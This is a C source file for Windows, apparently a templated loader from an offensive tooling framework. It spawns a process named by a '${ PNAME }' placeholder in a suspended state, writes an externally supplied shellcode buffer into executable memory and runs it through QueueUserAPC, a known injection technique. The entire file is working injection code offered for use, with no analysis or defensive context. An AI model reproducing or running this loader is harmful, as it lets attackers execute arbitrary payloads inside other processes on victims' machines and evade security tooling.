#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include <stdio.h>
#include <windows.h>

int main( int argc, char * argv[] ) {
    STARTUPINFO si         = { sizeof( si ) };
    PROCESS_INFORMATION pi = { 0 };
    LPCSTR target          = "${ PNAME }";

    printf( "[+] Tasked to spawn: %s\n", target );

    if ( !CreateProcessA( target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        printf( "[-] CreateProcess failed (%d).\n", GetLastError() );
        return 1;
    }
    printf( "[+] Created process %s with PID %d\n", target, pi.dwProcessId );

    LPVOID lpBaseAddress = VirtualAllocEx( pi.hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( lpBaseAddress == NULL ) {
        printf( "[-] VirtualAllocEx failed (%d).\n", GetLastError() );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        return 1;
    }
    printf( "[+] Allocated memory at %p\n", lpBaseAddress );

    if ( !WriteProcessMemory( pi.hProcess, lpBaseAddress, shellcode, shellcode_size, NULL ) ) {
        printf( "[-] WriteProcessMemory failed (%d).\n", GetLastError() );
        VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        return 1;
    }

    printf( "[+] Wrote %zu bytes to %p\n", shellcode_size, lpBaseAddress );

    if ( !QueueUserAPC( (PAPCFUNC)lpBaseAddress, pi.hThread, NULL ) ) {
        printf( "[-] QueueUserAPC failed (%d).\n", GetLastError() );
        VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        return 1;
    }
    printf( "[+] Queued APC to %p\n", lpBaseAddress );

    ResumeThread( pi.hThread );
    printf( "[+] Resumed thread %d\n", pi.dwThreadId );

    WaitForSingleObject( pi.hProcess, INFINITE );
    printf( "[+] Process %d exited\n", pi.dwProcessId );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return 0;
}